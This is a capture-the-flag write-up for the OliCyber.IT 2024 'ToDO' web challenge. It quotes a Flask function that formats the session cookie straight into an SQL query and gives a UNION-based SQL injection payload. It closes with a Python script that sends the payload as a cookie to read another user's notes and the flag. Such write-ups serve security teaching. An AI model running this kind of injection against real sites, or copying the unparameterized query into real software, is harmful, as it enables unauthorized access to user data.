# OliCyber.IT 2024 - Regional CTF

## [web] ToDO (29 solves)

I wanted to learn some Python and Flask, nothing better than a todo app, that's what Reddit says!

Website: [http://todo.challs.territoriale.olicyber.it](http://todo.challs.territoriale.olicyber.it)

Author: Aleandro Prudenzano <@drw0if>

## Solution

The application is composed by a web server, implemented with Flask inside `app.py`, and a set of useful function to interact with the sqlite database, `db.py`. By analyzing the source code we can quickly notice that all the queries are not executed using prepared statements, but the variable parameters are directly formatted inside the query strings. This can lead to SQLinjection if the input parameters are not correctly escaped.

This indeed happens insie the function `get_user_from_session`:

```python
    def get_user_from_session(self, session_id):
        cursor = self.get_cursor()

        cursor.execute(
            """SELECT users.id, users.username
            FROM users
            JOIN sessions ON users.id = sessions.user_id
            WHERE sessions.id = '%s';""" % (session_id,))

        users = cursor.fetchall()
        cursor.close()

        if len(users) == 1:
            return users[0]

        return None
```

We can then perform a SQLinjection to alter the query and make it return back the tasks belonging to another user, just by using the correctly crafted payload, passed as a session cookie.

A possible payload is `' UNION SELECT id, username FROM users WHERE username='antonio' --`; with this payload, the query will give us back all data associated with the user `antonio`, who is the one containing the flag among its notes.

## Exploit

```python
#!/usr/bin/env python3

import logging
import os
import requests
import re

# For HTTP connection
URL = os.environ.get("URL", "http://todo.challs.territoriale.olicyber.it")
if URL.endswith("/"):
    URL = URL[:-1]


cookies = {
    "session": "' UNION SELECT id, username FROM users WHERE username='antonio' -- ",
}

r = requests.get(f"{URL}/todo", cookies=cookies)
flag = re.compile(r"flag\{.*\}").search(r.text)

if flag:
    print(flag.group())
else:
    print("Flag not found")
```
